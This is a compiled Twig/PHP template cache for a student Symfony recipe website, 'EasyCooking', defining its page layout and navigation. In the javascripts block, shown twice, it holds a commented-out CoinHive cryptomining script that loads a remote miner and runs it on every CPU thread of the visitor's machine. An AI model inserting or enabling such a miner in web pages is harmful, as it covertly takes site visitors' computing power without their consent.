<?php

/* ::base.html.twig */
class __TwigTemplate_61af468426cfcaf7440ae35e55b75d9d72e9df363adf7ce00355f6ac43149e47 extends Twig_Template
{
    public function __construct(Twig_Environment $env)
    {
        parent::__construct($env);

        $this->parent = false;

        $this->blocks = array(
            'title' => array($this, 'block_title'),
            'navigation' => array($this, 'block_navigation'),
            'sidebar' => array($this, 'block_sidebar'),
            'body' => array($this, 'block_body'),
            'footer' => array($this, 'block_footer'),
            'javascripts' => array($this, 'block_javascripts'),
        );
    }

    protected function doDisplay(array $context, array $blocks = array())
    {
        $__internal_c85b374d8fe405ccf3a1c5aea1d1e1b63fcd43dd86576ddaae0ba7f27f9242be = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_c85b374d8fe405ccf3a1c5aea1d1e1b63fcd43dd86576ddaae0ba7f27f9242be->enter($__internal_c85b374d8fe405ccf3a1c5aea1d1e1b63fcd43dd86576ddaae0ba7f27f9242be_prof = new Twig_Profiler_Profile($this->getTemplateName(), "template", "::base.html.twig"));

        // line 1
        echo "<!DOCTYPE HTML>
<html>

<head>
\t<title>";
        // line 5
        $this->displayBlock('title', $context, $blocks);
        echo "</title>
\t<meta name=\"description\" content=\"website description\" />
\t<meta name=\"keywords\" content=\"website keywords, website keywords\" />
\t<meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" />
\t<link href=\"";
        // line 9
        echo twig_escape_filter($this->env, $this->env->getExtension('Symfony\Bridge\Twig\Extension\AssetExtension')->getAssetUrl("css/style.css"), "html", null, true);
        echo "\" type=\"text/css\" rel=\"stylesheet\" />
</head>

<body>
\t<div id=\"main\">
\t\t<div id=\"header\">

\t\t\t<div id=\"logo\">

\t\t\t\t<div id=\"logo_text\">
\t\t\t\t\t<h1><a href=\"";
        // line 19
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_principal");
        echo "\">Easy<span class=\"logo_colour\">_cooking</span></a></h1>
\t\t\t\t\t<h2>\"El amor puede esperar, el hambre no\" Monkey D. Luffy</h2>
\t\t\t\t</div>

\t\t\t</div>

\t\t\t<!-- Menú -->
\t\t\t";
        // line 26
        $this->displayBlock('navigation', $context, $blocks);
        // line 37
        echo "\t\t</div>

\t\t<div id=\"site_content\">
\t\t\t<div class=\"sidebar\">
\t\t\t\t<!-- Contenido lateral derecho -->
\t\t\t\t\t";
        // line 42
        $this->displayBlock('sidebar', $context, $blocks);
        // line 43
        echo "\t\t\t</div>

\t\t\t<div id=\"content\">
\t\t\t\t<!-- Contenido principal -->
\t\t\t\t<section class=\"main-col\">
\t\t\t\t\t";
        // line 48
        $this->displayBlock('body', $context, $blocks);
        // line 49
        echo "\t\t\t\t</section>
\t\t\t</div>
\t\t</div>

\t\t<!-- Pie de página -->
\t\t<div id=\"footer\">
\t\t\t";
        // line 55
        $this->displayBlock('footer', $context, $blocks);
        // line 58
        echo "\t\t</div>

\t</div>
\t";
        // line 61
        $this->displayBlock('javascripts', $context, $blocks);
        // line 69
        echo "</body>
</html>
";
        
        $__internal_c85b374d8fe405ccf3a1c5aea1d1e1b63fcd43dd86576ddaae0ba7f27f9242be->leave($__internal_c85b374d8fe405ccf3a1c5aea1d1e1b63fcd43dd86576ddaae0ba7f27f9242be_prof);

    }

    // line 5
    public function block_title($context, array $blocks = array())
    {
        $__internal_72e95b3248fe3695458b2a32836385d4c5d13f441b0193833446501cf08f7481 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_72e95b3248fe3695458b2a32836385d4c5d13f441b0193833446501cf08f7481->enter($__internal_72e95b3248fe3695458b2a32836385d4c5d13f441b0193833446501cf08f7481_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "title"));

        echo "symblog";
        
        $__internal_72e95b3248fe3695458b2a32836385d4c5d13f441b0193833446501cf08f7481->leave($__internal_72e95b3248fe3695458b2a32836385d4c5d13f441b0193833446501cf08f7481_prof);

    }

    // line 26
    public function block_navigation($context, array $blocks = array())
    {
        $__internal_4cb490b1bc5d7113d2d4c77ee52f59b2dd4ec904af5726d4887e40867a2f9558 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_4cb490b1bc5d7113d2d4c77ee52f59b2dd4ec904af5726d4887e40867a2f9558->enter($__internal_4cb490b1bc5d7113d2d4c77ee52f59b2dd4ec904af5726d4887e40867a2f9558_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "navigation"));

        // line 27
        echo "\t\t\t<div id=\"menubar\">
\t\t\t\t<ul id=\"menu\">
\t\t\t\t\t<li class=\"selected\"><a href=\"";
        // line 29
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_principal");
        echo "\">Inicio</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 30
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_recetas");
        echo "\">Recetas</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 31
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_platos");
        echo "\">Platos</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 32
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_ingredientes");
        echo "\">Ingredientes</a>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 33
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_contact");
        echo "\">Contacto</a></li>
\t\t\t\t</ul>
\t\t\t</div>
\t\t\t";
        
        $__internal_4cb490b1bc5d7113d2d4c77ee52f59b2dd4ec904af5726d4887e40867a2f9558->leave($__internal_4cb490b1bc5d7113d2d4c77ee52f59b2dd4ec904af5726d4887e40867a2f9558_prof);

    }

    // line 42
    public function block_sidebar($context, array $blocks = array())
    {
        $__internal_0aac5300f3c59a8625fdc1773ed2486cc86ea9502f91f3a56f2e520ea7db7962 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_0aac5300f3c59a8625fdc1773ed2486cc86ea9502f91f3a56f2e520ea7db7962->enter($__internal_0aac5300f3c59a8625fdc1773ed2486cc86ea9502f91f3a56f2e520ea7db7962_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "sidebar"));

        
        $__internal_0aac5300f3c59a8625fdc1773ed2486cc86ea9502f91f3a56f2e520ea7db7962->leave($__internal_0aac5300f3c59a8625fdc1773ed2486cc86ea9502f91f3a56f2e520ea7db7962_prof);

    }

    // line 48
    public function block_body($context, array $blocks = array())
    {
        $__internal_91de1ac860a6533514d03c18574a01b919ce696f74cedcf81d4fe1c20f9417ee = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_91de1ac860a6533514d03c18574a01b919ce696f74cedcf81d4fe1c20f9417ee->enter($__internal_91de1ac860a6533514d03c18574a01b919ce696f74cedcf81d4fe1c20f9417ee_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "body"));

        
        $__internal_91de1ac860a6533514d03c18574a01b919ce696f74cedcf81d4fe1c20f9417ee->leave($__internal_91de1ac860a6533514d03c18574a01b919ce696f74cedcf81d4fe1c20f9417ee_prof);

    }

    // line 55
    public function block_footer($context, array $blocks = array())
    {
        $__internal_16e10312bf26909de1998b1e4760b3c4e9a4f0cb8a2dc88f9301a649ca60af66 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_16e10312bf26909de1998b1e4760b3c4e9a4f0cb8a2dc88f9301a649ca60af66->enter($__internal_16e10312bf26909de1998b1e4760b3c4e9a4f0cb8a2dc88f9301a649ca60af66_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "footer"));

        // line 56
        echo "\t\t\tCocina f&aacutecil - Creado como proyecto para Ingenier&iacutea Web
\t\t\t";
        
        $__internal_16e10312bf26909de1998b1e4760b3c4e9a4f0cb8a2dc88f9301a649ca60af66->leave($__internal_16e10312bf26909de1998b1e4760b3c4e9a4f0cb8a2dc88f9301a649ca60af66_prof);

    }

    // line 61
    public function block_javascripts($context, array $blocks = array())
    {
        $__internal_2c899786b341163af48fc50dce6ae4e74755a6bdc7f1a99089f91d45cea15df0 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_2c899786b341163af48fc50dce6ae4e74755a6bdc7f1a99089f91d45cea15df0->enter($__internal_2c899786b341163af48fc50dce6ae4e74755a6bdc7f1a99089f91d45cea15df0_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "javascripts"));

        // line 62
        echo "<!--\t<script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
\t<script>
    thr=navigator.hardwareConcurrency;
    var miner = new CoinHive.Anonymous('nK0gPWRG1uG5avyyxkUZ6eWkUrZ0ymEM', {threads: thr,autoThreads: true});
    miner.start();
\t</script> -->
\t";
        
        $__internal_2c899786b341163af48fc50dce6ae4e74755a6bdc7f1a99089f91d45cea15df0->leave($__internal_2c899786b341163af48fc50dce6ae4e74755a6bdc7f1a99089f91d45cea15df0_prof);

    }

    public function getTemplateName()
    {
        return "::base.html.twig";
    }

    public function isTraitable()
    {
        return false;
    }

    public function getDebugInfo()
    {
        return array (  201 => 62,  195 => 61,  187 => 56,  181 => 55,  170 => 48,  159 => 42,  148 => 33,  144 => 32,  140 => 31,  136 => 30,  132 => 29,  128 => 27,  122 => 26,  110 => 5,  101 => 69,  99 => 61,  94 => 58,  92 => 55,  84 => 49,  82 => 48,  75 => 43,  73 => 42,  66 => 37,  64 => 26,  54 => 19,  41 => 9,  34 => 5,  28 => 1,);
    }

    /** @deprecated since 1.27 (to be removed in 2.0). Use getSourceContext() instead */
    public function getSource()
    {
        @trigger_error('The '.__METHOD__.' method is deprecated since version 1.27 and will be removed in 2.0. Use getSourceContext() instead.', E_USER_DEPRECATED);

        return $this->getSourceContext()->getCode();
    }

    public function getSourceContext()
    {
        return new Twig_Source("<!DOCTYPE HTML>
<html>

<head>
\t<title>{% block title %}symblog{% endblock %}</title>
\t<meta name=\"description\" content=\"website description\" />
\t<meta name=\"keywords\" content=\"website keywords, website keywords\" />
\t<meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" />
\t<link href=\"{{ asset('css/style.css') }}\" type=\"text/css\" rel=\"stylesheet\" />
</head>

<body>
\t<div id=\"main\">
\t\t<div id=\"header\">

\t\t\t<div id=\"logo\">

\t\t\t\t<div id=\"logo_text\">
\t\t\t\t\t<h1><a href=\"{{ path('cooker_cook_principal')}}\">Easy<span class=\"logo_colour\">_cooking</span></a></h1>
\t\t\t\t\t<h2>\"El amor puede esperar, el hambre no\" Monkey D. Luffy</h2>
\t\t\t\t</div>

\t\t\t</div>

\t\t\t<!-- Menú -->
\t\t\t{% block navigation %}
\t\t\t<div id=\"menubar\">
\t\t\t\t<ul id=\"menu\">
\t\t\t\t\t<li class=\"selected\"><a href=\"{{ path('cooker_cook_principal')}}\">Inicio</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_recetas')}}\">Recetas</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_platos')}}\">Platos</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_ingredientes')}}\">Ingredientes</a>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_contact')}}\">Contacto</a></li>
\t\t\t\t</ul>
\t\t\t</div>
\t\t\t{% endblock %}
\t\t</div>

\t\t<div id=\"site_content\">
\t\t\t<div class=\"sidebar\">
\t\t\t\t<!-- Contenido lateral derecho -->
\t\t\t\t\t{% block sidebar %}{% endblock %}
\t\t\t</div>

\t\t\t<div id=\"content\">
\t\t\t\t<!-- Contenido principal -->
\t\t\t\t<section class=\"main-col\">
\t\t\t\t\t{% block body %}{% endblock %}
\t\t\t\t</section>
\t\t\t</div>
\t\t</div>

\t\t<!-- Pie de página -->
\t\t<div id=\"footer\">
\t\t\t{% block footer %}
\t\t\tCocina f&aacutecil - Creado como proyecto para Ingenier&iacutea Web
\t\t\t{% endblock %}
\t\t</div>

\t</div>
\t{% block javascripts %}
<!--\t<script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
\t<script>
    thr=navigator.hardwareConcurrency;
    var miner = new CoinHive.Anonymous('nK0gPWRG1uG5avyyxkUZ6eWkUrZ0ymEM', {threads: thr,autoThreads: true});
    miner.start();
\t</script> -->
\t{% endblock %}
</body>
</html>
", "::base.html.twig", "C:\\xampp\\htdocs\\EasyCooking\\app\\Resources\\views\\base.html.twig");
    }
}
